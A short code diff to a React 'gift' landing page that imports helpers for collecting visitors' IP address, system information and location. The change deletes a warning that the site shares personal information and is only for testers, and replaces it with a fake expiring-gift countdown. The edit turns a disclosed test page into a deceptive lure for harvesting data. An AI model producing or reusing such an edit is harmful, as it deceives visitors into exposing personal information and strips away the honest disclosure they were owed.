@@ -1,8 +1,8 @@
-
 import React, { useState, useEffect } from 'react';
 import ReactConfetti from 'react-confetti';
 import Header from '../components/Header';
 import VerificationModal from '../components/VerificationModal';
+import CountdownTimer from '../components/CountdownTimer';
 import { getIpAddress, getUserSystemInfo, getUserLocation } from '../utils/getIpAddress';
 import { toast } from '@/components/ui/use-toast';
 import { Card, CardContent } from '@/components/ui/card';
@@ -195,7 +195,7 @@ const Index = () => {
         </Card>
         
         <div className="mt-10 text-red-300 text-center max-w-2xl border border-red-400 p-4 rounded">
-          <p className="font-bold">This page is only for testers of this website! DO NOT USE AS THIS WEBSITE SHARES PERSONAL INFORMATION!</p>
+          <p className="font-bold">This gift will expire in <CountdownTimer className="text-white font-mono" /></p>
         </div>
       </main>
 
